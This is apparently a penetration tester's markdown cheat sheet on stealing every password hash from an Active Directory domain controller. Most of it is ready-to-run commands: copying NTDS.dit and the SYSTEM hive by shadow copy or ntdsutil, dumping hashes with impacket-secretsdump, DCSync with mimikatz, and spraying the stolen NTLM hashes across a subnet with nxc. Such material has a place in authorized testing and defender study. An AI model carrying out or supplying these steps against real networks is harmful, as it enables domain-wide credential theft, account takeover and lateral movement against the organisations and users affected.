---
tags:
  - Credential_Access
  - Foundational
  - Impacket
  - Windows
---

## NTDS.dit Extraction
resources: [HackTricks NTDS.dit](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-information-in-printers#ntds.dit), [HackTricks DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)

> [!important] Extract all domain hashes from a Domain Controller. Requires DA/SYSTEM on DC.

### VSS Shadow Copy Method [Remote]
```cmd
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
vssadmin delete shadows /for=C: /quiet
```

### ntdsutil Method [alternative]
> [!info] Files saved to `C:\temp\ntds_dump\Active Directory\ntds.dit` and `C:\temp\ntds_dump\registry\SYSTEM`.

```cmd
ntdsutil "activate instance ntds" "ifm" "create full C:\temp\ntds_dump" "quit" "quit"
```

### Extract Hashes [Local]
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL > domain_hashes.txt
```

### DCSync - No File Copy Needed [alternative]
> [!important] Requires replication rights (DA, Enterprise Admin, or specific ACL).

```cmd
.\mimikatz.exe "lsadump::dcsync /domain:<Domain> /all /csv" "exit" > dcsync_all.txt
```

```cmd
.\mimikatz.exe "lsadump::dcsync /domain:<Domain> /user:Administrator" "exit"
```

### DCSync from Kali [alternative]
```bash
impacket-secretsdump <Domain>/<Username>:<Password>@<DomainController> > dcsync_remote.txt
```

```bash
impacket-secretsdump -hashes :<NTLMHash> <Domain>/<Username>@<DomainController>
```

### Validate Extracted Hashes [Local]
```bash
nxc smb <DCIP> -u Administrator -H '<NTLMHash>' -d <Domain>
```

```bash
nxc smb 192.168.1.0/24 -u Administrator -H '<NTLMHash>' -d <Domain>
```

```bash
nxc smb <DCIP> -u users.txt -H hashes.txt -d <Domain> --no-bruteforce --continue-on-success
```
